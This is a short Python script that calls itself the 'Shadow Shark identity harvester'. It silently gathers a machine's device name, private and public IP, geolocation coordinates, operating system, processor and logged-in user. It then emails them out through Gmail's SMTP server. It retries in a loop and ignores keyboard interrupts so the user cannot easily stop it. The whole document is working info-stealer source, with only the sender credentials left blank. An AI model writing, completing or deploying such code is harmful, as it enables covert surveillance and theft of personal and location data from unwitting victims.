# -*- coding: utf-8 -*-
"""


@author: Mr. Shark Spam Bot
"""
import socket
import json
import platform
import smtplib
import getpass

while True:
    try:

        # Find device name and use it to find private IP address.
        device_name = socket.getfqdn()
        private_ip = socket.gethostbyname(device_name)

        # Find location and public IP of the device.
        try:
            ipinfo = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ipinfo.connect(('ipinfo.io', 80))
            ipinfo.send(b'GET / HTTP/1.1\r\nHost: ipinfo.io\r\n\r\n')
            data = ipinfo.recv(1024).decode()
            ipinfo.close()
            data = data[data.find('{'):]
            data = json.loads(data)
            coordinates = data['loc']
            public_ip = data['ip']
        except socket.gaierror:
            continue

        # Find operating system, its version, and whether it is 32 or 64 bit.
        system = platform.system()
        version = platform.version()
        bit = platform.machine()
        if system == 'Windows':
            system_version = system + ' ' + version + ' ' + bit
        if system == 'Linux':
            system_version = system + ' ' + version + ' ' + bit
        if system == 'Darwin':
            system_version = 'MacOS' + ' ' + version + ' ' + bit

        # Find the current logged in user.
        user = getpass.getuser()

        # Find the system processor.
        processor = platform.processor()

        # Send an email about found information.
        try:
            GMAIL_SERVICE = smtplib.SMTP('smtp.gmail.com', 587)
        except socket.gaierror:
            continue
        try:
            GMAIL_SERVICE.ehlo()
            GMAIL_SERVICE.starttls()
        except smtplib.SMTPServerDisconnected:
            continue
        try:
            GMAIL_SERVICE.login('', '')
        except smtplib.SMTPAuthenticationError:
            break
        try:
            GMAIL_SERVICE.sendmail('', '',
f'Subject:Information found by Shadow Shark identity harvester.\n\n\
Device name: {device_name}\nPrivate IP: {private_ip}\nPublic IP: {public_ip}\n\
OS: {system_version}\nProcessor: {processor}\nCurrent logged in user: {user}\n\
Coordinates: {coordinates}\n')
        except smtplib.SMTPServerDisconnected:
            continue

        break

    except KeyboardInterrupt:
        continue
